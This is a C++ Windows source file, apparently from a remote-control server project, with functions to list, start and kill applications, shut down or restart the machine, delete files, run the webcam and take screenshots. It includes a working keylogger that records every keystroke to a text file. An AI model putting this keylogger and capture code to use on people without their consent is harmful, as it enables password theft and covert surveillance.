#include "WindowAPI.h"

// Convert std::string to std::wstring
std::wstring stringToWString(const std::string& str) {
	int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), nullptr, 0);
	std::wstring wstrTo(size_needed, 0);
	MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
	return wstrTo;
}
// Convert std::wstring to std::string
std::string wstringToString(const std::wstring& wstr) {
	int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), nullptr, 0, nullptr, nullptr);
	std::string strTo(size_needed, 0);
	WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, nullptr, nullptr);
	return strTo;
}
// Get target path from a shortcut (.lnk)
std::string getShortcutTarget(const std::string& shortcutPath) {
    HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {
        std::cerr << "Failed to initialize COM: " << hr << std::endl;
        return "";
    }
    IShellLinkW* psl = nullptr;
    IPersistFile* ppf = nullptr;
    wchar_t targetPath[MAX_PATH] = { 0 };

    std::wstring wShortcutPath = stringToWString(shortcutPath);
    if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, nullptr, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (void**)&psl))) {
        if (SUCCEEDED(psl->QueryInterface(IID_IPersistFile, (void**)&ppf))) {
            if (SUCCEEDED(ppf->Load(wShortcutPath.c_str(), STGM_READ))) {
                psl->GetPath(targetPath, MAX_PATH, nullptr, 0);
            }
            ppf->Release();
        }
        psl->Release();
    }

    CoUninitialize(); // Uninitialize COM
    return wstringToString(targetPath);
}
// Find shortcut files in a directory
std::vector<std::pair<std::string, std::string>> findShortcutsInDirectory(const std::string& directory) {
	std::vector<std::pair<std::string, std::string>> shortcuts;

	WIN32_FIND_DATAA findData;
	HANDLE hFind;

	std::string searchPath = directory + "\\*.lnk";
	hFind = FindFirstFileA(searchPath.c_str(), &findData);

	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
				std::string shortcutName = findData.cFileName;
				std::string fullPath = directory + "\\" + shortcutName;
				std::string target = getShortcutTarget(fullPath);
				shortcuts.emplace_back(shortcutName.substr(0, shortcutName.find_last_of(".")), target);
			}
		} while (FindNextFileA(hFind, &findData) != 0);
		FindClose(hFind);
	}

	return shortcuts;
}
// List all applications from Desktop and Start Menu
std::vector<std::pair<std::string, std::string>> ListAllApplications() {
	std::vector<std::pair<std::string, std::string>> applications;

	// Desktop folder for the current user
	char desktopPath[MAX_PATH];
	if (FAILED(SHGetFolderPathA(nullptr, CSIDL_DESKTOPDIRECTORY, nullptr, SHGFP_TYPE_CURRENT, desktopPath))) {
		std::cerr << "Failed to retrieve Desktop path." << std::endl;
		return applications;
	}
	auto desktopApps = findShortcutsInDirectory(desktopPath);
	applications.insert(applications.end(), desktopApps.begin(), desktopApps.end());

	// Start Menu folder for all users
	std::string startMenuPath = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs";
	auto systemApps = findShortcutsInDirectory(startMenuPath);
	applications.insert(applications.end(), systemApps.begin(), systemApps.end());

	// Start Menu folder for the current user
	char userStartMenuPath[MAX_PATH];
	SHGetFolderPathA(nullptr, CSIDL_PROGRAMS, nullptr, SHGFP_TYPE_CURRENT, userStartMenuPath);
	auto userApps = findShortcutsInDirectory(userStartMenuPath);
	applications.insert(applications.end(), userApps.begin(), userApps.end());

	return applications;
}
// Launch an application
bool StartApp(const std::string& appPath) {
	wstring wAppPath = stringToWString(appPath);
	if (!appPath.empty() && PathFileExistsW(wAppPath.c_str())) {
		ShellExecuteW(nullptr, L"open", wAppPath.c_str(), nullptr, nullptr, SW_SHOWNORMAL);
		return true;
	}
	else {
		cout << "The application does not exist or the path is invalid!" << endl;
		return false;
	}
}
bool StopApp(const std::string& appPath) {
	std::wstring wAppPath = stringToWString(appPath);
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE) {
		std::cerr << "Unable to take process snapshot!" << std::endl;
		return false;
	}

	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(hProcessSnap, &pe32)) {
		do {
			HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
			if (hProcess != nullptr) {
				wchar_t exePath[MAX_PATH] = { 0 };
				if (GetModuleFileNameExW(hProcess, nullptr, exePath, MAX_PATH)) {
					std::wstring exePathW(exePath);
					if (exePathW == wAppPath) {
						if (TerminateProcess(hProcess, 0)) {
							std::cout << "Successfully terminated: " << appPath << std::endl;
						}
						else {
							std::cerr << "Failed to terminate process: " << appPath << std::endl;
							return false;
						}
						CloseHandle(hProcess);
						break;
					}
				}
				CloseHandle(hProcess);
			}
		} while (Process32Next(hProcessSnap, &pe32));
	}
	else {
		std::cerr << "Unable to enumerate processes!" << std::endl;
		return false;
	}
	CloseHandle(hProcessSnap);
	return true;
}																																											
int ShutdownSystem() {
	int result = system("shutdown /s /t 20");
	return result;
}
int ResetSystem() {
	return system("shutdown /r /t 20");
}
string TranslateKey(int key, bool capsLock, bool shiftPressed, bool winPressed) {
	if (key == VK_SPACE) return "[SPACE]";
	if (key == VK_RETURN) return "[ENTER]";
	if (key == VK_BACK) return "[BACKSPACE]";
	if (key == VK_SHIFT) return "[SHIFT]";
	if (key == VK_CONTROL) return "[CTRL]";
	if (key == VK_TAB) return "[TAB]";
	if (key == VK_ESCAPE) return "[ESC]";
	if (key == VK_LWIN || key == VK_RWIN) return winPressed ? "[WIN]" : "";//Xu ly phim Window

	//Xu li phim so va cac k tu dac biet
	if (key >= '0' && key <= '9') {
		if (shiftPressed) {
			string shiftSymbols = ")!@#$%^&*(";  //Shift tuong ung voi cac so
			return string(1, shiftSymbols[key - '0']);
		}
		return string(1, (char)key);  //So binh thuong
	}

	//Xu ly cac phim chu cai
	if (key >= 'A' && key <= 'Z') {
		if (capsLock ^ shiftPressed) {
			return string(1, (char)key);  // Chu Hoa
		}
		return string(1, (char)(key + 32));  // Chu Thuong
	}

	//Xu li cac phim khong chu cai
	switch (key) {
	case VK_OEM_1: return shiftPressed ? ":" : ";";
	case VK_OEM_2: return shiftPressed ? "?" : "/";
	case VK_OEM_3: return shiftPressed ? "~" : "`";
	case VK_OEM_4: return shiftPressed ? "{" : "[";
	case VK_OEM_5: return shiftPressed ? "|" : "\\";
	case VK_OEM_6: return shiftPressed ? "}" : "]";
	case VK_OEM_7: return shiftPressed ? "\"" : "'";
	case VK_OEM_PLUS: return shiftPressed ? "+" : "=";
	case VK_OEM_COMMA: return shiftPressed ? "<" : ",";
	case VK_OEM_MINUS: return shiftPressed ? "_" : "-";
	case VK_OEM_PERIOD: return shiftPressed ? ">" : ".";
	}

	return "";  // Khong xu li cac phim khac
}
void Keylogger(bool& isKeyLoggerOn, bool &isServerOn) { 
	//Turn off the app?
	fstream output;
	output.open("_Data/keylogger.txt", ios::out);
	bool capsLock = false;  // Trạng thái của Caps Lock
	bool winPressed = false;  // Trạng thái của phím Windows
	vector<int> previousStates(256, 0);  // Mảng lưu trạng thái của các phím trước đó

	while (isServerOn) {
		if (!isKeyLoggerOn) continue;
		Sleep(10);  // Giảm tải CPU

		// Kiểm tra trạng thái của CapsLock
		capsLock = (GetKeyState(VK_CAPITAL) & 0x0001);

		// Kiểm tra trạng thái của phím Windows
		winPressed = (GetAsyncKeyState(VK_LWIN) & 0x8000) || (GetAsyncKeyState(VK_RWIN) & 0x8000);

		for (int i = 8; i <= 0xFE; i++) {  // Kiểm tra tất cả các phím từ 0x08 đến 0xFE
			SHORT keyState = GetAsyncKeyState(i);  // Kiểm tra trạng thái phím

			if ((keyState & 0x8000) && !(previousStates[i] & 0x8000)) {  // Phím vừa được nhấn
				bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000);
				string keyData = TranslateKey(i, capsLock, shiftPressed, winPressed);
				if (!keyData.empty()) {
					output << "Key Pressed: " << keyData << endl;  // In ra màn hình
				}
			}

			// Cập nhật trạng thái của phím
			previousStates[i] = keyState;
		}
	}
	output.close();
}
bool DeleteFile(const string& filepath) {
	if (DeleteFileA(filepath.c_str())) {
		return true;
	}
	else {
		DWORD errorCode = GetLastError(); // Lấy mã lỗi
		if (errorCode == ERROR_ACCESS_DENIED) {
			cerr << "Access Denied. Check permissions or run as administrator.\n";
		}
		else {
			cerr << "Error deleting file: " << errorCode << endl;
		}
		return false;
	}
}
void Webcam(bool& isWebcamOn, bool& isServerOn) {
	WebcamController webcam;																																																										
	MSG msg;
	bool isWebcamRunning = false;
	while (isServerOn) {
		while (PeekMessage(&msg, nullptr, 0, 0, PM_REMOVE)) {
			TranslateMessage(&msg);
			DispatchMessage(&msg);

			if (msg.message == WM_QUIT) {
				return;
			}
		}
		if (isWebcamOn && !isWebcamRunning) {
			webcam.startWebcam();
			isWebcamRunning = true;
		}
		else if (!isWebcamOn && isWebcamRunning) {
			webcam.stopWebcam();
			isWebcamRunning = false;
		}
	}
}
bool CaptureScreen(){
	const string outputFile = ComPath + "Screenshot/screenshot.jpg";
	int screenWidth = 1920;
	int screenHeight = 1080;

	HDC hDesktopDC = GetDC(NULL);

	HDC hCaptureDC = CreateCompatibleDC(hDesktopDC);

	HBITMAP hCaptureBitmap = CreateCompatibleBitmap(hDesktopDC, screenWidth, screenHeight);

	SelectObject(hCaptureDC, hCaptureBitmap);

	BitBlt(hCaptureDC, 0, 0, screenWidth, screenHeight, hDesktopDC, 0, 0, SRCCOPY);

	CImage image;
	image.Attach(hCaptureBitmap);
	HRESULT hr = image.Save(outputFile.c_str(), Gdiplus::ImageFormatJPEG);


	image.Detach();
	DeleteObject(hCaptureBitmap);
	DeleteDC(hCaptureDC);
	ReleaseDC(NULL, hDesktopDC);

	if (SUCCEEDED(hr)) return true;
	return false;
}

